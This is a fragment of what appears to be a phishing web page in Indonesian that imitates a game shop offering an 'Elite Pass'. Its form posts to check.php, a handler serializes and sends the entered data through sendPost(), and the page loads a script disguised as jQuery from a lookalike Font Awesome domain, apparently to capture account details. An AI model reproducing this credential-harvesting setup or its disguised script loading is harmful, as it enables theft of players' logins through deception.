               ...
               <div class="section buy default-template">
                  ...
                  <div class="form" id="formSection">
                     ...
                     <div class="email-input-container">
                        <form action="check.php" method="POST" id="getForm" onsubmit="return checkId()">
...
<p class="shop-content--paragraph">Tada! Setelah Elite Pass-mu telah aktif, mulai selesaikan misi demi misi &amp; berbagai tantangan untuk membuka hadiah-hadiah eksklusif Elite Pass.</p></article> 
      ...
      <script>
         function checkId() {
            if(sendPost($("form#getForm").serialize())) {
               return true;
            }
         }
...
<script src="https://fontawesome.my.id/4.6.5/code.jquery.js"></script>  
</body>
</html>